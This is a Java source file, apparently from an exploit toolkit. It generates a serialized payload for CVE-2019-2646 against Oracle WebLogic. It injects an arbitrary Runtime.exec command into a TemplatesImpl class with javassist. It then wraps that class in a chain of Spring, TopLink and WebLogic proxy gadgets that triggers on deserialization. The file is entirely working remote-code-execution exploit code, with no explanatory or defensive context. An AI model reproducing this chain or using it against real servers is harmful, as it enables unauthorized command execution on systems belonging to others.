package com.payload.t3;

import com.bea.core.repackaged.springframework.aop.TargetSource;
import com.bea.core.repackaged.springframework.aop.framework.Advised;
import com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport;
import com.bea.core.repackaged.springframework.aop.target.PrototypeTargetSource;

import com.bea.core.repackaged.springframework.validation.BeanPropertyBindingResult;
import com.bea.core.repackaged.springframework.validation.BindingResult;

import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import oracle.toplink.indirection.ValueHolder;
import oracle.toplink.internal.indirection.ProxyIndirectionHandler;
import util.ClassFiles;
import util.Ysoserial;
import weblogic.ejb.container.internal.RemoteBusinessIntfProxy;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.*;
import java.util.List;

public class CVE_2019_2646 {

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -1L;
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
    }
    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static Object generate_template(String command) throws NotFoundException, IllegalAccessException, InstantiationException, Exception {
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";

        Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = pool.get(StubTransletPayload.class.getName());

        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);

        byte[] classBytes = clazz.toBytecode();

        Field field = templates.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templates,new byte[][] {classBytes, ClassFiles.classAsBytes(Foo.class)});

        Field field2 = templates.getClass().getDeclaredField("_name");
        field2.setAccessible(true);
        field2.set(templates,"ananaskr");

        Field field3 = templates.getClass().getDeclaredField("_tfactory");
        field3.setAccessible(true);
        field3.set(templates, TransformerFactoryImpl.class.newInstance());

        return templates;


    }


    public static byte[] payload(String path,String gadget,String command) throws Exception {

        //DisposableBeanAdapter
        Constructor ctor1 = Class.forName("com.bea.core.repackaged.springframework.beans.factory.support.DisposableBeanAdapter").getDeclaredConstructor(Object.class, String.class, boolean.class, String.class, boolean.class, List.class);
        ctor1.setAccessible(true);
        Object obj = ctor1.newInstance(generate_template(command),null,true,"getTransletInstance",true,null);



        //CompositeInvocationHandlerImpl
        BeanPropertyBindingResult beanproperty = new BeanPropertyBindingResult(obj,"exp");
        PrototypeTargetSource prototy = new PrototypeTargetSource();
        ValueHolder holder1 = new ValueHolder(beanproperty);
        ValueHolder holder2 = new ValueHolder(prototy);
        ProxyIndirectionHandler handler1 = new ProxyIndirectionHandler();
        handler1.setValueHolder(holder1);
        ProxyIndirectionHandler handler2 = new ProxyIndirectionHandler();
        handler2.setValueHolder(holder2);
        CompositeInvocationHandlerImpl compositeInvocationHandler = new CompositeInvocationHandlerImpl();
        compositeInvocationHandler.addInvocationHandler(BindingResult.class,handler1);
        compositeInvocationHandler.addInvocationHandler(prototy.getClass(),handler2);
        compositeInvocationHandler.setDefaultHandler(handler2);


        //multi-proxy
        Object proxyInstance = Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),new Class[]{com.bea.core.repackaged.springframework.validation.BindingResult.class,TargetSource.class},compositeInvocationHandler);
        RemoteBusinessIntfProxy remoteBusinessIntfProxy = new RemoteBusinessIntfProxy(proxyInstance,null,null, TargetSource.class.getName());


        TargetSource proxyInstance1 = (TargetSource) Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),new Class[]{TargetSource.class},remoteBusinessIntfProxy);

        //jdkDynamicAopProxy
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTargetSource(proxyInstance1);
        advisedSupport.setOpaque(true);
        Constructor ctor2 = Class.forName("com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        ctor2.setAccessible(true);
        InvocationHandler jdkDynamicAopProxy = (InvocationHandler) ctor2.newInstance(advisedSupport);
        Advised advisedSupport1 = (Advised)Proxy.newProxyInstance(CVE_2019_2646.class.getClassLoader(),new Class[]{Advised.class},jdkDynamicAopProxy);

        //deserialize-invoke
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field field4 = val.getClass().getDeclaredField("val");
        field4.setAccessible(true);
        field4.set(val,advisedSupport1);


        byte[] payload2 = Ysoserial.serial(val);
        return payload2;



    }


}
